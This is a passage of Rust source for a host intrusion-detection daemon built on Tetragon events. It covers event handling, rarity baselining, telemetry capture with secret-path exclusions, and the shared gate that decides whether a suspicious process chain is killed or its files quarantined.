//! The daemon: shared state plus the run loop.
//!
//! One thread tails Tetragon's export and does all the detection work; a second
//! thread accepts control-socket connections. They share a `Mutex<Daemon>`,
//! which is cheap because the tail thread only holds the lock while it is
//! folding an event, and the socket handler answers one request per connection.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use serde_json::{json, Value};

use crate::alert::{Alert, ExplainOption, UpdateLine};
use crate::allowlist::{Allowlist, Candidate};
use crate::baseline::{Baseline, Demotion, Learned, Observation};
use crate::bundle::{self, AncestryRow};
use crate::chain::{self, ChainStore};
use crate::config::{severity_at_least, Config};
use crate::context;
use crate::digest;
use crate::event::{HookHit, RawEvent};
use crate::explain::{allowlist_note, build_alert, Finding};
use crate::feeds::Feeds;
use crate::incident;
use crate::policy::{family_of, PolicySet};
use crate::proctable::{ProcInfo, ProcTable};
use crate::provenance::{Classifier, PacmanSl};
use crate::rarity::{RarityInfo, RarityStore, Tuple};
use crate::receipt;
use crate::rules::{pkgtree, RuleCtx, UserRule};
use crate::scoring::{self, EventFacts};
use crate::selectors::Mismatch;
use crate::store::AlertStore;
use crate::tail::Tailer;
use crate::util;

/// The kernel policy that replaced `net-pkg-subtree-egress`. It watches every
/// process at `medium`, because "an unusual port on the internet" is a weak
/// signal on its own; moatd raises it to `high` when the process turns out to
/// be inside a package install, which is the part the kernel could not decide.
pub const SUSPICIOUS_PORT_EGRESS: &str = "moat-net-suspicious-port-egress";
pub const HISTORY_TAMPER: &str = "moat-rootkit-history-tamper";

/// The rules whose SUBJECT is moat's own directories. Everything else is cut
/// off from them entirely (`is_own_store`).
const SELF_WATCH_RULES: &[&str] = &[
    "moat-rootkit-evidence-tamper",
    "moat-rootkit-sensor-tamper",
];

pub static RELOAD: AtomicBool = AtomicBool::new(false);
pub static SHUTDOWN: AtomicBool = AtomicBool::new(false);

extern "C" fn on_signal(sig: libc::c_int) {
    match sig {
        libc::SIGHUP => RELOAD.store(true, Ordering::SeqCst),
        _ => SHUTDOWN.store(true, Ordering::SeqCst),
    }
}

/// SIGHUP reloads policies, allowlist and config; SIGTERM/SIGINT stop cleanly.
pub fn install_signal_handlers() {
    unsafe {
        libc::signal(libc::SIGHUP, on_signal as *const () as libc::sighandler_t);
        libc::signal(libc::SIGTERM, on_signal as *const () as libc::sighandler_t);
        libc::signal(libc::SIGINT, on_signal as *const () as libc::sighandler_t);
        libc::signal(libc::SIGPIPE, libc::SIG_IGN);
    }
}

struct Dedupe {
    id: String,
    first_seen: u64,
    count: u64,
}

/// One chain's answer to "is moat confident enough to ACT on this", shared by
/// the kill and the quarantine (`Daemon::chain_gate`).
struct ChainGate {
    facts: Vec<crate::contain::StepFact>,
    /// The trigger families, sorted and deduped, for the decisions record.
    families: Vec<String>,
    /// The uid every trigger ran as, for `refuse_to_kill`.
    uid: u32,
    /// `Ok` to act; `Err(why)` is the sentence both refusals print.
    verdict: Result<(), String>,
}

pub struct Daemon {
    pub cfg: Config,
    pub cfg_path: PathBuf,
    pub policies: PolicySet,
    pub allowlist: Allowlist,
    pub table: ProcTable,
    pub feeds: Feeds,
    pub store: AlertStore,
    pub rules: Vec<Box<dyn UserRule>>,
    pub mode: String,
    pub homes: Vec<String>,
    /// Btrfs subvolume roots, for turning a dentry-derived path back into the
    /// path the user would recognise (`util::dentry_abs`).
    pub subvols: Vec<(String, String)>,
    /// Last throttle alert per cgroup, so a flood raises one alert an hour and
    /// not one per dropped batch.
    throttle_seen: std::collections::HashMap<String, u64>,
    /// The heartbeat found in state.json at startup: when moat last knew it was
    /// alive. 0 on a machine that has never run it.
    last_heartbeat: u64,
    /// When something last read `status`. The panel polls it, so this is
    /// moatd's only evidence that a human could see an alert if one arrived.
    last_watched: u64,
    /// When the last "nobody is watching" alert went out.
    last_unwatched_alert: u64,
    /// Live correlation-driven containments (`contain.rs`).
    pub contain: crate::contain::ContainStore,
    /// Binaries the KERNEL should stop watching, per policy. See
    /// `exclude_binary`.
    pub kernel_exclusions: std::collections::BTreeMap<String, Vec<String>>,
    /// Chains already decided on. A chain grows for up to an hour and
    /// `note_chain` re-enters on every growth; one decision per chain.
    killed_chains: std::collections::BTreeSet<String>,
    /// Template stems that failed to render, from the last `render-policies`.
    pub policies_failed: Vec<String>,
    pub started: u64,
    pub events_seen: u64,
    pub alerts_emitted: u64,
    /// Alerts recorded with `suppressed_by` set: still on the timeline, never
    /// notified, never counted (BASELINE §8).
    pub alerts_suppressed: u64,
    dedupe: HashMap<String, Dedupe>,
    /// exec_id -> alert id, for kill confirmation (NOTES §7).
    pending_kill: HashMap<String, String>,

    // --- baselining --------------------------------------------------------
    /// BASELINE §1: official / foreign / user / unknown, from the pacman db.
    pub provenance: Classifier,
    /// LEARNING §1: decayed per-tuple counters.
    pub rarity: RarityStore,
    /// BASELINE §3 and §4: the learning window, proposals, the noise guard.
    pub baseline: Baseline,
    /// Rarity of the (actor, parent) tuple recorded at `process_exec` time, so
    /// an alert on the same exec quotes it instead of counting it twice.
    exec_rarity: HashMap<String, RarityInfo>,
    /// Guards the one level of recursion `emit` can take (a noise-guard alert
    /// raised from inside the emission of the alert that tripped it).
    in_meta_alert: bool,

    // --- analysis (LEARNING §3, §4, §5) ------------------------------------
    /// LEARNING §3: one accumulator per live package-manager subtree.
    pub receipts: receipt::Tracker,
    /// LEARNING §5: `moatctl set digest on|off`, persisted in state.json.
    pub digest_enabled: bool,
    /// Unix seconds of the last delivered digest, or 0.
    pub digest_last_sent: u64,
    /// Incident snapshots taken since start, for the log and for `status`.
    pub incidents_captured: u64,
    /// What is *in* the files a high chain implicated (`content.rs`). Holds the
    /// hourly budget and the sha256 cache, which is why it lives on the daemon
    /// rather than being constructed per call: a fresh analyser every time
    /// would be a fresh allowance every time.
    pub content: crate::content::Analyzer,
    /// Design 2b/3a: alerts sharing a process tree and crossing families are
    /// one sequence. Bounded and self-pruning; see `chain.rs`.
    pub chains: ChainStore,
    /// Policies armed for in-kernel enforcement individually, while the daemon
    /// as a whole stays in monitor mode.
    ///
    /// Enforcement is all-or-nothing otherwise, and all-or-nothing is not
    /// usable here: arming every Sigkill-carrying policy at once on a desktop
    /// means a kernel module load on USB hotplug gets its loader killed, and
    /// `ssh` gets killed for reading your own key. The only safe way to start
    /// enforcing is one rule at a time, on a rule whose false-positive surface
    /// you have already measured.
    ///
    /// This deliberately does NOT move `mode`: the userland kill path
    /// (`maybe_enforce`) gates on that, so leaving it at monitor means only the
    /// kernel policy named here can kill anything.
    pub enforcing_rules: std::collections::BTreeSet<String>,
    /// Where the post-start re-arming has got to. See `arm_tick`.
    pub arming: Arming,
    /// Kernel policies `verify_enforcement` last confirmed are in `enforce`.
    ///
    /// Deliberately NOT persisted: "the kernel agreed with us before the last
    /// restart" is not evidence about the kernel now, and a restart is exactly
    /// when the agreement breaks.
    pub enforcing_verified: std::collections::BTreeSet<String>,
    /// Kernel policies `enforcing_rules` claims are armed and the kernel says
    /// are not. Non-empty means the panel is lying and `status` has to say so.
    pub enforcing_unverified: std::collections::BTreeSet<String>,
    /// The unverified set the last `moat-x-protection-changed` alert named, so
    /// a failure that persists for a week is one alert and not one a minute.
    last_arm_alert_set: std::collections::BTreeSet<String>,
    /// Unix seconds of the last `verify_enforcement` run.
    last_verify: u64,
    /// Monotonic ULID source. Alert ids are the timeline: `store.load()` keys a
    /// BTreeMap on them, `moatctl list` calls the last one newest, and
    /// `--since <id>` pages on them. A plain `Ulid::new()` only orders by the
    /// millisecond it embeds, so two alerts in the same millisecond — a burst
    /// from one process, or a sensor restart replaying `/proc` — sorted by
    /// their random suffix and the "newest" was a coin flip. The generator
    /// increments the suffix instead, so ids from one run are strictly
    /// increasing whatever the clock resolution.
    ids: ulid::Generator,

    // --- telemetry ---------------------------------------------------------
    /// `telemetry.jsonl`, opened only when at least one non-`alerts` class is
    /// on. `None` costs one `Option` check per event and nothing else, which
    /// matters: this sits on the exec path at 42 events a second.
    pub telemetry: Option<crate::telemetry::TelemetryStore>,
    /// Telemetry records written since start, for `status`.
    pub telemetry_written: u64,
    /// Telemetry events that reached the daemon and were dropped by the
    /// create/modify ladder before anything was written.
    pub telemetry_filtered: u64,
}

/// The key the noise guard counts on: the same (rule, actor, parent, dir)
/// tuple the baseline uses, so "this shape is noisy" means the same thing in
/// both places and a user reading either sees the same grouping.
fn noise_tuple(f: &Finding) -> String {
    crate::baseline::tuple_key(&f.rule, &f.proc.exe, &f.parent_exe(), &f.file_dir())
}

impl Daemon {
    /// The next alert id, strictly increasing within this run.
    ///
    /// `Generator::generate` only fails after 2^80 ids inside one millisecond;
    /// falling back to a random ULID there is correct-but-unordered, which is
    /// the behaviour we had everywhere before.
    fn next_id(&mut self) -> String {
        self.ids
            .generate()
            .map(|u| u.to_string())
            .unwrap_or_else(|_| ulid::Ulid::new().to_string())
    }

    pub fn new(cfg: Config, cfg_path: &Path) -> std::io::Result<Daemon> {
        let store = AlertStore::open(
            &cfg.paths.alerts(),
            &cfg.paths.alerts_rotated(),
            cfg.thresholds.alerts_max_bytes,
            &cfg.group,
        )?;
        let policies = PolicySet::load(&cfg.paths.policies_dir);
        let allowlist = Allowlist::load(&cfg.paths.allowlist_dir);
        let feeds = Feeds::load(&cfg.paths.feeds());
        let homes = util::human_homes(&cfg.paths.passwd);
        let subvols = util::subvol_roots(Path::new("/proc/self/mounts"));
        let table = ProcTable::new(cfg.thresholds.ancestry_max, cfg.thresholds.process_prune_secs);
        let state = read_state(&cfg.paths.state_file());
        let mode = persisted_mode(&state).unwrap_or_else(|| cfg.mode.clone());
        let contain_enabled = persisted_contain(&state).unwrap_or(cfg.contain.enabled);
        let contain_kill = persisted_kill(&state).unwrap_or_else(|| cfg.contain.kill.clone());
        let mut cfg = cfg;
        cfg.contain.enabled = contain_enabled;
        cfg.contain.kill = contain_kill;
        let exclusions_at_start = read_exclusions(&cfg.paths.state_file());
        let now = util::unix_secs();

        let provenance = Classifier::new(
            &cfg.paths.pacman_local,
            &cfg.baseline.trusted_repos,
            &homes,
            Box::new(PacmanSl {
                bin: cfg.paths.pacman.clone(),
            }),
        );
        let rarity = RarityStore::load(
            &cfg.paths.rarity_file(),
            &cfg.group,
            cfg.learning.half_life_days,
            cfg.learning.rare_max_count,
            cfg.learning.rare_max_age_days,
        );
        let baseline = Baseline::load(
            &cfg.paths.state_dir,
            &cfg.group,
            cfg.baseline.learning_days,
            cfg.baseline.learn_min_days,
            cfg.baseline.noisy_rule_per_day,
            persisted_installed_at(&state),
            now,
        );

        let telemetry = open_telemetry(&cfg);
        // The hourly content-analysis budget survives a restart, because a
        // budget a restart refills is not a budget -- and the daemon is
        // restartable by anything that can crash it.
        let mut content = crate::content::Analyzer::new(crate::content::Limits {
            max_bytes: cfg.content.max_bytes,
            per_hour: cfg.content.per_hour,
            deny_roots: vec![
                cfg.paths.state_dir.to_string_lossy().into_owned(),
                "/var/log/moat".to_string(),
            ],
        });
        content.restore(
            persisted_u64(&state, "content", "hour_start"),
            persisted_u64(&state, "content", "used") as u32,
        );
        let digest_enabled = persisted_digest_enabled(&state).unwrap_or(cfg.digest.enabled);
        let digest_last_sent = persisted_u64(&state, "digest_summary", "last_sent_unix");

        Ok(Daemon {
            cfg,
            cfg_path: cfg_path.to_path_buf(),
            policies,
            allowlist,
            table,
            feeds,
            store,
            rules: crate::rules::all(),
            mode,
            homes,
            subvols,
            throttle_seen: std::collections::HashMap::new(),
            last_heartbeat: state
                .as_ref()
                .and_then(|s| s.get("heartbeat"))
                .and_then(|v| v.as_u64())
                .unwrap_or(0),
            last_watched: now,
            last_unwatched_alert: 0,
            kernel_exclusions: exclusions_at_start,
            killed_chains: std::collections::BTreeSet::new(),
            contain: crate::contain::ContainStore::from_state(
                state.as_ref().and_then(|s| s.get("contain")),
            ),
            policies_failed: Vec::new(),
            started: now,
            events_seen: 0,
            alerts_emitted: 0,
            alerts_suppressed: 0,
            dedupe: HashMap::new(),
            pending_kill: HashMap::new(),
            provenance,
            rarity,
            baseline,
            exec_rarity: HashMap::new(),
            in_meta_alert: false,
            receipts: receipt::Tracker::default(),
            digest_enabled,
            digest_last_sent,
            incidents_captured: 0,
            content,
            chains: ChainStore::new(),
            ids: ulid::Generator::new(),
            enforcing_rules: persisted_enforcing_rules(&state),
            arming: Arming::Idle,
            enforcing_verified: std::collections::BTreeSet::new(),
            enforcing_unverified: std::collections::BTreeSet::new(),
            last_arm_alert_set: std::collections::BTreeSet::new(),
            last_verify: 0,
            telemetry,
            telemetry_written: 0,
            telemetry_filtered: 0,
        })
    }

    /// SIGHUP: config, policy annotations and allowlist all come back from disk.
    pub fn reload(&mut self) {
        match Config::load(&self.cfg_path) {
            Ok(c) => {
                self.table.max_depth = c.thresholds.ancestry_max;
                self.table.prune_secs = c.thresholds.process_prune_secs;
                self.cfg = c;
            }
            Err(e) => log::warn!("reload: keeping old config: {}", e),
        }
        // A class turned off in moat.toml stops being written on SIGHUP. The
        // kernel side needs `moatd telemetry apply` (a policy load is not
        // hot-reloadable), but the file must not keep growing in the meantime.
        self.telemetry = open_telemetry(&self.cfg);
        self.policies = PolicySet::load(&self.cfg.paths.policies_dir);
        // A reload can change which policies exist, and therefore which ones
        // `enforcement_to_apply` wants armed. Re-read the kernel on the next
        // tick rather than leaving `status` quoting the previous policy set.
        self.invalidate_verification();
        self.allowlist = Allowlist::load(&self.cfg.paths.allowlist_dir);
        self.homes = util::human_homes(&self.cfg.paths.passwd);
        self.subvols = util::subvol_roots(Path::new("/proc/self/mounts"));
        self.provenance.set_homes(&self.homes);
        self.baseline.learning_days = self.cfg.baseline.learning_days;
        self.baseline.learn_min_days = self.cfg.baseline.learn_min_days;
        self.baseline.noisy_rule_per_day = self.cfg.baseline.noisy_rule_per_day;
        self.rarity.half_life_days = self.cfg.learning.half_life_days;
        self.rarity.rare_max_count = self.cfg.learning.rare_max_count;
        self.rarity.rare_max_age_days = self.cfg.learning.rare_max_age_days;
        log::info!(
            "reloaded: {} policies, {} allowlist rules",
            self.policies.len(),
            self.allowlist.len()
        );
    }

    pub fn reload_allowlist(&mut self) {
        self.allowlist = Allowlist::load(&self.cfg.paths.allowlist_dir);
    }

    // ------------------------------------------------------------- event path

    pub fn handle_line(&mut self, line: &str) {
        let Some(ev) = RawEvent::parse(line) else {
            return;
        };
        self.events_seen += 1;
        let now = util::unix_secs();

        if let Some(t) = &ev.process_throttle {
            self.note_throttle(t, now);
            return;
        }

        if let Some(exec) = &ev.process_exec {
            let Some(exec_id) = self.table.on_exec(exec) else {
                return;
            };
            self.note_exec_telemetry(exec, ev.time.as_deref());
            // Rarity learns from every exec, alert or not (LEARNING §1).
            self.record_exec_rarity(&exec_id, now);
            // So does the install receipt (LEARNING §3): what an install did is
            // mostly what it *executed*, and none of that raises an alert.
            self.note_receipt_exec(&exec_id, now);
            let findings = self.run_rules_exec(exec, &exec_id, now);
            self.emit_all(findings);
            return;
        }

        if let Some(exit) = &ev.process_exit {
            self.note_exit_telemetry(exit, ev.time.as_deref());
            if let Some(exec_id) = self.table.on_exit(exit, now) {
                self.confirm_kill(&exec_id, exit.signal.as_deref());
                // The root of a package subtree exiting is what closes a
                // receipt (LEARNING §3).
                self.finish_receipt(&exec_id, exit.status, now);
            }
            return;
        }

        if let Some(hook) = ev.hook() {
            if let Some(p) = &hook.ev.parent {
                self.table.observe(p);
            }
            for a in &hook.ev.ancestors {
                self.table.observe(a);
            }
            let exec_id = hook
                .ev
                .process
                .as_ref()
                .and_then(|p| self.table.observe(p))
                .unwrap_or_default();
            // A `/proc/self/fd/<n>` binary gets its name back from the hook's
            // own exec'd-file argument when it has one.
            self.table
                .resolve_fd_binary(&exec_id, hook.binprm_path().as_deref());

            // THE TELEMETRY FORK. A `moat-telemetry-*` policy is a record, not
            // a claim, and it must never reach rule evaluation: the file class
            // alone posts ~19 events/s through the kernel filter during a
            // package install (measured), and running each of those against
            // every rule — each of which walks ancestry — is how a detection
            // daemon melts. The process table is updated above, because
            // ancestry is most of what makes a telemetry record worth keeping,
            // and then we leave.
            if crate::telemetry::is_telemetry_policy(hook.policy_name()) {
                self.note_hook_telemetry(&hook, &exec_id, ev.time.as_deref(), now);
                return;
            }

            // The kernel's own finding, UNLESS a userland rule owns this
            // policy id.
            //
            // Both halves used to fire for the same event. `moat-net-first-
            // contact`'s kernel policy deliberately posts every non-loopback
            // connect and leaves the judgement to userspace -- the kernel
            // cannot know which destinations this machine has met -- so
            // `policy_finding` turned each one into an alert, and
            // `run_rules_hook` added another when the destination really was
            // new. The result was a rule documented as "reports a destination
            // once and then never again" emitting on every connection: 11 of
            // 14 in a ten-minute sample read `common`, one of them seen 1593
            // times. That put `net` in nearly every process tree, which is
            // what made `qualifies()` fire on ordinary package updates.
            //
            // A rule that filters in userspace owns its id outright. There is
            // no case where both should speak.
            let mut findings = if self.rule_owns(hook.policy_name()) {
                Vec::new()
            } else {
                self.policy_finding(&hook, &exec_id, now).into_iter().collect::<Vec<_>>()
            };
            findings.extend(self.run_rules_hook(&hook, &exec_id, now));
            self.emit_all(findings);
        }
    }

    // -------------------------------------------------------------- telemetry

    pub fn flush_telemetry(&mut self) {
        if let Some(s) = self.telemetry.as_mut() {
            s.flush();
        }
    }

    fn write_telemetry(&mut self, rec: &crate::telemetry::Record) {
        let Some(store) = self.telemetry.as_mut() else {
            return;
        };
        if let Err(e) = store.append(rec) {
            log::warn!("telemetry: {}", e);
            return;
        }
        self.telemetry_written += 1;
    }

    fn note_exec_telemetry(&mut self, exec: &crate::event::ExecEvent, time: Option<&str>) {
        if !self.cfg.telemetry.process || self.telemetry.is_none() {
            return;
        }
        let ts = util::normalize_ts(time.unwrap_or_default());
        if let Some(r) = crate::telemetry::exec_record(&self.cfg.telemetry, exec, &ts) {
            self.write_telemetry(&r);
        }
    }

    fn note_exit_telemetry(&mut self, exit: &crate::event::ExitEvent, time: Option<&str>) {
        if !self.cfg.telemetry.process || self.telemetry.is_none() {
            return;
        }
        let ts = util::normalize_ts(time.unwrap_or_default());
        if let Some(r) = crate::telemetry::exit_record(exit, &ts) {
            self.write_telemetry(&r);
        }
    }

    /// A `moat-telemetry-*` hook event. This is the second stage of the file
    /// class's two-stage filter: the kernel decided the path was
    /// executable-shaped, and here we decide whether it is a create worth
    /// dropping or a modify worth keeping (`telemetry.rs`).
    fn note_hook_telemetry(&mut self, hook: &HookHit, exec_id: &str, time: Option<&str>, now: u64) {
        use crate::telemetry::{self as t, FileShape, FileVerdict};
        if self.telemetry.is_none() {
            return;
        }
        let ts = util::normalize_ts(time.unwrap_or_default());
        let policy = hook.policy_name();

        if policy == "moat-telemetry-network-connect" {
            if !self.cfg.telemetry.network {
                return;
            }
            if let Some(r) = t::network_record(hook, &self.table, exec_id, &ts) {
                self.write_telemetry(&r);
            }
            return;
        }

        if !self.cfg.telemetry.file {
            return;
        }
        let Some(path) = hook.file_path() else {
            return;
        };
        let chmod = policy == "moat-telemetry-file-became-executable";
        let verdict = if chmod {
            FileVerdict::ChmodX
        } else {
            t::verdict_for(
                Path::new(&path),
                now,
                self.cfg.telemetry.create_window_secs,
            )
        };
        if t::is_quiet_create(&self.cfg.telemetry, verdict, &path) {
            self.telemetry_filtered += 1;
            return;
        }

        let p = Path::new(&path);
        let meta = std::fs::metadata(p).ok();
        let shape = if self.cfg.telemetry.file_suffixes.iter().any(|s| path.ends_with(s.as_str())) {
            FileShape::Script
        } else if t::looks_like_elf(p) {
            FileShape::Elf
        } else if chmod {
            FileShape::Other
        } else {
            FileShape::Location
        };
        let bytes = meta.as_ref().map(|m| m.len());
        // A hash of a file that is still being written is not a lie, it is a
        // hash of what was on disk when the record was made; the record says
        // so by carrying the size beside it.
        let sha256 = bytes
            .filter(|n| *n <= 32 * 1024 * 1024)
            .and_then(|_| util::sha256_file(p).ok());
        let body = self.capture_body(&path, bytes);

        let r = t::file_record(
            &path, verdict, shape, bytes, sha256, body, &self.table, exec_id, &ts,
        );
        self.write_telemetry(&r);
    }

    /// Opt-in body capture for a small script.
    ///
    /// This is the one thing in the telemetry classes that puts file *contents*
    /// anywhere they can be shipped, so it inherits `evidence::is_secret_path`
    /// wholesale — the same function that stops a credential being staged for
    /// an AI — plus a size cap and a "must decode as text" test. A path that
    /// looks like key material is never read at all, whatever the config says.
    fn capture_body(&self, path: &str, bytes: Option<u64>) -> Option<String> {
        if !self.cfg.telemetry.capture_body {
            return None;
        }
        if crate::evidence::is_secret_path(path) {
            return None;
        }
        // Staged evidence and quarantined files are copies of the accused
        // artefact and may be the user's credentials. `moat-ship`'s Guard blanks
        // their *paths* wherever they appear, but a captured body is a separate
        // string it cannot recognise — so the refusal has to be here too, at the
        // only place a body is ever read.
        if path.ends_with(".suspect")
            || Path::new(path).starts_with(&self.cfg.analysis.bundle_dir)
            || Path::new(path).starts_with(self.cfg.paths.quarantine())
        {
            return None;
        }
        let n = bytes?;
        if n == 0 || n > self.cfg.telemetry.capture_body_max_bytes {
            return None;
        }
        let raw = std::fs::read(path).ok()?;
        // Text only. A truncated ELF in a JSON string helps nobody and is a
        // large amount of base64 on the wire for it.
        String::from_utf8(raw).ok()
    }

    fn run_rules_exec(&mut self, exec: &crate::event::ExecEvent, exec_id: &str, now: u64) -> Vec<Finding> {
        let mut rules = std::mem::take(&mut self.rules);
        let mut out = Vec::new();
        for r in rules.iter_mut() {
            if !r.enabled(&self.cfg) {
                continue;
            }
            let ctx = self.ctx(now);
            out.extend(r.on_exec(exec, exec_id, &ctx));
        }
        self.rules = rules;
        out
    }

    fn run_rules_hook(&mut self, hook: &HookHit, exec_id: &str, now: u64) -> Vec<Finding> {
        let mut rules = std::mem::take(&mut self.rules);
        let mut out = Vec::new();
        for r in rules.iter_mut() {
            if !r.enabled(&self.cfg) {
                continue;
            }
            let ctx = self.ctx(now);
            out.extend(r.on_hook(hook, exec_id, &ctx));
        }
        self.rules = rules;
        out
    }

    /// Two of the four rarity tuples come from execs alone: "has this parent
    /// ever launched this program" and "has npm ever spawned this". They are
    /// counted here, once, and the result is stashed so an alert about the same
    /// exec quotes it rather than counting it a second time.
    fn record_exec_rarity(&mut self, exec_id: &str, now: u64) {
        let Some(me) = self.table.get(exec_id) else {
            return;
        };
        let exe = me.exe.clone();
        if exe.is_empty() {
            return;
        }
        let parent = self.table.ancestry(exec_id).first().map(|p| p.exe.clone());
        let root = pkgtree::pkg_root_for(&self.table, exec_id).map(|r| r.exe.clone());

        if let Some(parent) = parent {
            let info = self.rarity.observe(
                &Tuple::parent(&exe, &parent),
                now,
            );
            // Bounded: the table is pruned, this map is not, so cap it.
            if self.exec_rarity.len() > 8192 {
                self.exec_rarity.clear();
            }
            self.exec_rarity.insert(exec_id.to_string(), info);
        }
        if let Some(root) = root {
            if root != exe {
                self.rarity
                    .observe(&Tuple::pkg_child(&root, &exe), now);
            }
        }
    }

    fn ctx(&self, now: u64) -> RuleCtx<'_> {
        RuleCtx {
            rarity: &self.rarity,
            cfg: &self.cfg,
            table: &self.table,
            feeds: &self.feeds,
            homes: &self.homes,
            now,
            mode: &self.mode,
            armed: &self.enforcing_rules,
        }
    }

    /// A `moat-*` policy event becomes a finding; anything else is
    /// enrichment only (CONTRACT §3).
    ///
    /// Before it does, the event is re-validated against the policy's own
    /// selectors (`selectors.rs`). The kernel has been seen reporting a value
    /// its own filter should have rejected — the SSH-key policy naming
    /// `/sys/devices/system/cpu/online` — and an alert is a claim about what
    /// happened, so such an event becomes a `moat-x-sensor-mismatch` record
    /// instead of a false accusation.
    /// Look at what is actually IN the files a high chain implicated.
    ///
    /// This is the whole trigger surface of `content.rs`, and it is deliberately
    /// this small. moat is not an anti-virus: there is no scan on write, no scan
    /// on exec, no timer. A file is read here only because the correlator
    /// already concluded that a *sequence* of behaviour in one process tree was
    /// worth escalating — the same conclusion that justifies a quarantine and a
    /// kill, both of which are more drastic than reading the bytes.
    ///
    /// **Order matters: this runs before `quarantine_chain_artifacts`.**
    /// Quarantine moves the file into `/var/lib/moat/quarantine`, which is
    /// moat's own store and which `content.rs` refuses outright — so analysing
    /// afterwards would find nothing at the original path and would be refused
    /// at the new one. Analysing first also means the bundle describes the file
    /// as it was when it acted, which is the thing under discussion.
    ///
    /// The findings never move a severity. They are appended to the alert as a
    /// `content` update, which folds into `explain.evidence` for every reader
    /// and into `bundle.md` for the agent. `chain::escalate` and `scoring.rs`
    /// remain the only things that decide how loud anything is.
    fn analyse_chain_artifacts(&mut self, c: &crate::chain::Chain) {
        if !self.cfg.content.enabled {
            return;
        }
        // The stall this pass can add to the event thread, bounded in one
        // number. Measured on this machine: ~4.4 ms per MB, so four files at
        // the 8 MiB cap is ~150 ms in the worst case that never happens, and
        // ~20 ms in the case that does. The hourly budget bounds the hour; this
        // bounds the burst, which is what a reader of the tail actually feels.
        // `note_chain` re-enters as the chain grows and each alert is analysed
        // once, so a wider chain is spread over several passes rather than
        // skipped.
        const MAX_FILES_PER_PASS: usize = 4;
        let mut analysed = 0usize;
        for step in c.steps.iter().filter(|s| s.is_trigger()) {
            if analysed >= MAX_FILES_PER_PASS {
                log::debug!(
                    "chain {}: {} files analysed this pass; the rest wait for the next",
                    c.id,
                    analysed
                );
                break;
            }
            let Some(a) = self.find_alert(&step.alert) else { continue };
            // An allowlisted step is the user saying the event is fine; a
            // sequence is not a licence to go back on that, and `chain.rs`
            // already applies the same rule to escalation.
            if a.suppressed_by.is_some() {
                continue;
            }
            // Analysed once. `note_chain` re-enters every time the chain grows,
            // for up to an hour, and without this a five-step chain would read
            // its files once per growth for the whole window.
            //
            // "Once" includes the passes that decided not to read anything: an
            // alert whose files were skipped because the hourly budget was spent
            // keeps that record rather than being retried on the next growth.
            // Retrying is the version of this that re-reads a chain's files
            // every few seconds for an hour as soon as the budget frees, and
            // the record says plainly which of the two happened.
            if !a.content.is_empty() {
                continue;
            }
            // The two files a finding is about: the binary that acted, and the
            // file it touched. `is_own_store` is checked here as well as inside
            // the analyser -- the analyser is the authority, this is the guard
            // that already exists and has already caught this project twice.
            let mut targets: Vec<(&'static str, String)> = Vec::new();
            if !a.process.exe.is_empty() && !self.is_own_store(&a.process.exe) {
                targets.push(("actor", a.process.exe.clone()));
            }
            if let Some(f) = a.file.as_ref() {
                if !f.path.is_empty() && f.path != a.process.exe && !self.is_own_store(&f.path) {
                    targets.push(("target", f.path.clone()));
                }
            }
            let mut found = Vec::new();
            for (role, path) in targets.into_iter().take(MAX_FILES_PER_PASS - analysed) {
                analysed += 1;
                // Reuse the hash the incident snapshot already computed for
                // this file rather than walking it again. When there is none,
                // `Analyzer` hashes the buffer it has to read anyway.
                let known = incident_sha(&a, &path);
                found.push(
                    self.content
                        .analyse(&path, role, known.as_deref(), util::unix_secs()),
                );
            }
            if found.is_empty() {
                continue;
            }
            let value = Value::Array(found.iter().map(|f| f.to_json()).collect());
            for f in &found {
                match &f.skipped {
                    Some(why) => log::info!("chain {}: not reading {}: {}", c.id, f.path, why),
                    None => log::info!(
                        "chain {}: {} is {}, {} bytes, entropy {:.2}, {} marker(s), {} network ref(s)",
                        c.id,
                        f.path,
                        f.kind,
                        f.bytes,
                        f.entropy,
                        f.markers.len(),
                        f.urls.len() + f.hosts.len()
                    ),
                }
            }
            if let Err(e) = self.mark(&a.id, "content", value) {
                log::error!("alert {}: content update: {}", a.id, e);
            }
        }
    }

    /// The one decision behind BOTH acting on a chain and moving its files.
    ///
    /// `maybe_kill_tree` had this reasoning to itself, and quarantine had none
    /// at all: every `high` chain's exec/persist trigger files were moved
    /// aside. On 2026-09-05 at 22:03Z that meant a `critical` chain raised by
    /// the project's own `cargo test` run tried to quarantine
    /// `<repo>/target/release/moatctl` — the developer's build output, deleted
    /// from under them — and failed only because the mount happened to be
    /// read-only. Quarantine is not gentler than a kill; it is the same
    /// judgement with a slower failure. So it asks the same question, gets the
    /// same answer, and its refusal is written to `decisions.jsonl` in the same
    /// words, because the argument for ever trusting either action is a week of
    /// refusals that are all correct.
    fn chain_gate(&self, c: &crate::chain::Chain) -> ChainGate {
        // Facts from the alerts, not from the steps: a step carries no rarity,
        // and rarity is what separates a build from a first run.
        let mut facts: Vec<crate::contain::StepFact> = Vec::new();
        let mut uid = 0u32;
        for step in c.steps.iter().filter(|s| s.is_trigger()) {
            let Some(a) = self.find_alert(&step.alert) else { continue };
            if a.suppressed_by.is_some() {
                continue;
            }
            uid = a.process.uid;
            facts.push(crate::contain::StepFact {
                family: a.family.clone(),
                novel: matches!(
                    a.rarity,
                    crate::rarity::Rarity::FirstSeen | crate::rarity::Rarity::Rare
                ),
                pid: step.pid,
            });
        }
        let families: Vec<String> = {
            let mut f: Vec<String> = facts.iter().map(|x| x.family.clone()).collect();
            f.sort_unstable();
            f.dedup();
            f
        };
        let verdict = crate::contain::worth_killing_for(&c.severity, &facts);
        ChainGate {
            facts,
            families,
            uid,
            verdict,
        }
    }

    /// Move the artefacts a chain implicates out of the way.
    ///
    /// This replaces what was going to be a generated `Sigkill` policy for the
    /// dropper's path. That idea did not survive review: the step's `exe` is
    /// the caller before exec (`/usr/bin/python`), so the policy would have
    /// meant "kill any python that execs anything, machine-wide"; and the
    /// dropper's own path is a fresh random directory every run, so matching on
    /// it would never fire twice.
    ///
    /// Quarantine gets at the same thing without a kernel policy and without
    /// anything irreversible: the dropped binary and the persistence artefact
    /// are moved aside, chmod 000, with a manifest recording where they came
    /// from. Re-execution fails because the file is gone; `moatctl quarantine
    /// --restore` puts it back if this was wrong.
    ///
    /// **It passes the same gate a kill does** (`chain_gate`). Moving a file
    /// aside is not the gentle option: it deletes the developer's build output
    /// from where they left it, and the failure is silent until something goes
    /// looking. A chain the kill gate would spare is one moat is not confident
    /// about, and there is no confidence level at which taking someone's files
